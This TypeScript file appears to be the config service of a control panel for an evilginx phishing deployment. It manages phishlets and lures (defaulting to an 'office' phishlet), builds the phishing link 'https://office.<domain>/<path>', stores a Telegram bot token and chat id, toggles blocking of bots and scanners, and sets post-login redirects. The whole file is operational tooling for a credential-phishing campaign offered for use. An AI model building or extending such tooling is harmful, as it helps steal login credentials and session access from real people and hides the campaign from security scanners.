import * as fs from "fs";
import * as path from "path";
import chokidar, { FSWatcher } from "chokidar";
import type { Config } from "../types";

/* eslint-disable @typescript-eslint/no-unused-vars */
/**
 * Phishlet interface representing phishlet configuration
 * Used in configuration parsing
 */
interface Phishlet {
  hostname: string;
  unauth_url: string;
  enabled: boolean;
  visible: boolean;
}

/**
 * Lure interface representing lure configuration
 * Used in handling configuration from the evilginx service
 */
interface Lure {
  hostname: string;
  id: string;
  info: string;
  og_desc: string;
  og_image: string;
  og_title: string;
  og_url: string;
  path: string;
  paused: number;
  phishlet: string;
  redirect_url: string;
  redirector: string;
  ua_filter: string;
}
/* eslint-enable @typescript-eslint/no-unused-vars */

export class ConfigService {
  private configPath: string;
  private blacklistPath: string;
  private dataDbPath: string;
  private blacklistWatcher: FSWatcher | null = null;
  private isInitialized: boolean = false;
  private dataDir: string;

  constructor() {
    // Simply use the local data directory
    this.dataDir = path.resolve(process.cwd(), "data");

    // Ensure data directory exists with proper permissions
    try {
      fs.mkdirSync(this.dataDir, { recursive: true, mode: 0o755 });
    } catch (error) {
      console.error("Error creating data directory:", error);
      // Continue anyway, we'll handle file creation errors later
    }

    // Set paths for local files (including symlinks)
    this.configPath = path.join(this.dataDir, "config.json");
    this.blacklistPath = path.join(this.dataDir, "blacklist.txt");
    this.dataDbPath = path.join(this.dataDir, "data.db");

    console.log("Panel data directory:", this.dataDir);
    console.log("Panel data paths:", {
      configPath: this.configPath,
      blacklistPath: this.blacklistPath,
      dataDbPath: this.dataDbPath,
    });

    // Initialize files
    this.initializeFiles();

    // Only watch blacklist for changes, not config or data.db
    if (this.isInitialized) {
      this.setupWatchers();
    }
  }

  private initializeFiles() {
    try {
      // Check if required files exist - don't create them here
      // as they should be created by the init_sync_watch.sh script
      const configExists = fs.existsSync(this.configPath);
      const blacklistExists = fs.existsSync(this.blacklistPath);
      const dataDbExists = fs.existsSync(this.dataDbPath);

      console.log("Panel data files status:", {
        configExists,
        blacklistExists,
        dataDbExists,
      });

      // If files don't exist, they will be created by the init_sync_watch.sh script
      // We'll simply mark as initialized to continue

      this.isInitialized = true;
      console.log("File initialization completed successfully");
    } catch (error) {
      console.error("Error initializing files:", error);
      // Do not throw - we'll try to continue with limited functionality
      this.isInitialized = false;
    }
  }

  private setupWatchers() {
    try {
      // Only watch blacklist for changes for now
      this.blacklistWatcher = chokidar.watch(this.blacklistPath, {
        persistent: true,
        ignoreInitial: true,
      });

      this.blacklistWatcher.on("change", () => {
        console.log("Blacklist file changed");
      });

      console.log("File watchers set up successfully");
    } catch (error) {
      console.error("Error setting up file watchers:", error);
    }
  }

  public async readBlacklist(): Promise<string[]> {
    try {
      if (fs.existsSync(this.blacklistPath)) {
        const content = fs.readFileSync(this.blacklistPath, "utf8");
        return content.split("\n").filter((line) => line.trim() !== "");
      }
      return [];
    } catch (error) {
      console.error("Error reading blacklist:", error);
      return [];
    }
  }

  public async writeBlacklist(ips: string[]): Promise<boolean> {
    try {
      const content = ips.join("\n");
      fs.writeFileSync(this.blacklistPath, content, { mode: 0o644 });
      return true;
    } catch (error) {
      console.error("Error writing blacklist:", error);
      return false;
    }
  }

  public cleanup(): void {
    if (this.blacklistWatcher) {
      this.blacklistWatcher.close();
    }
  }

  public async readConfig(): Promise<Config | null> {
    try {
      if (fs.existsSync(this.configPath)) {
        const configData = fs.readFileSync(this.configPath, "utf8");
        return JSON.parse(configData) as Config;
      }
      return null;
    } catch (error) {
      console.error("Error reading config:", error);
      return null;
    }
  }

  public async getFullLink(): Promise<{
    fullUrl: string;
    domain: string;
    path: string;
  } | null> {
    try {
      const config = await this.readConfig();
      if (!config) return null;

      // Add null checks for all properties
      const general = config.general || {};
      const domain = general.domain || "";
      const lures = config.lures || [];
      const path = lures[0]?.path || "";
      const fullUrl = domain ? `https://office.${domain}${path}` : "";

      return {
        fullUrl,
        domain,
        path: path.replace(/^\/+/, ""), // Remove leading slash for display
      };
    } catch (error) {
      console.error("Error getting full link:", error);
      return null;
    }
  }

  public async writeConfig(config: Config): Promise<boolean> {
    try {
      // Write directly to the symlinked file in panel/data
      const configStr = JSON.stringify(config, null, 2);
      fs.writeFileSync(this.configPath, configStr, { mode: 0o644 });
      console.log("Successfully wrote config to:", this.configPath);
      return true;
    } catch (error) {
      console.error("Error writing config:", error);
      return false;
    }
  }

  public async updateTelegramSettings(
    botToken: string,
    chatId: string
  ): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) {
        // Create a complete config object
        const newConfig: Config = {
          general: {
            telegram_bot_token: botToken,
            telegram_chat_id: chatId,
            autocert: true,
            dns_port: 53,
            https_port: 443,
            bind_ipv4: "",
            external_ipv4: "",
            domain: "",
            unauth_url: "",
          },
          blacklist: { mode: "off" },
          phishlets: {},
          lures: [],
        };

        return await this.writeConfig(newConfig);
      }

      // Ensure general object exists
      config.general = config.general || {};

      config.general.telegram_bot_token = botToken;
      config.general.telegram_chat_id = chatId;

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating telegram settings:", error);
      return false;
    }
  }

  public async updateBlacklistMode(blockBots: boolean): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) {
        // Create a complete config object
        const newConfig: Config = {
          blacklist: { mode: blockBots ? "unauth" : "off" },
          general: {
            telegram_bot_token: "",
            telegram_chat_id: "",
            autocert: true,
            dns_port: 53,
            https_port: 443,
            bind_ipv4: "",
            external_ipv4: "",
            domain: "",
            unauth_url: "",
          },
          phishlets: {},
          lures: [],
        };

        return await this.writeConfig(newConfig);
      }

      // Ensure blacklist object exists
      config.blacklist = config.blacklist || {};

      config.blacklist.mode = blockBots ? "unauth" : "off";

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating blacklist mode:", error);
      return false;
    }
  }

  public async updateRedirectUrl(url: string): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) {
        // Create a complete config object
        const newConfig: Config = {
          general: {
            telegram_bot_token: "",
            telegram_chat_id: "",
            autocert: true,
            dns_port: 53,
            https_port: 443,
            bind_ipv4: "",
            external_ipv4: "",
            domain: "",
            unauth_url: url,
          },
          blacklist: { mode: "off" },
          phishlets: {},
          lures: [],
        };

        return await this.writeConfig(newConfig);
      }

      // Ensure general object exists
      config.general = config.general || {};

      config.general.unauth_url = url;

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating redirect URL:", error);
      return false;
    }
  }

  public async updateLinkSettings(
    afterLoginRedirect: string,
    useCaptcha: boolean,
    linkPath: string
  ): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) {
        console.error("Config not found");
        return false;
      }

      // Check if lures array exists and has at least one item
      if (
        !config.lures ||
        !Array.isArray(config.lures) ||
        config.lures.length === 0
      ) {
        // Create a lure if none exists
        if (!config.lures) {
          config.lures = [];
        }
        config.lures.push({
          hostname: "",
          id: "",
          info: "",
          og_desc: "",
          og_image: "",
          og_title: "",
          og_url: "",
          path: linkPath,
          paused: 0,
          phishlet: "office",
          redirect_url: afterLoginRedirect,
          redirector: "main",
          ua_filter: "",
        });
      } else {
        // Update first lure
        config.lures[0].path = linkPath;
        config.lures[0].redirect_url = afterLoginRedirect;
      }

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating link settings:", error);
      return false;
    }
  }
}

// Create singleton instance
export const configService = new ConfigService();
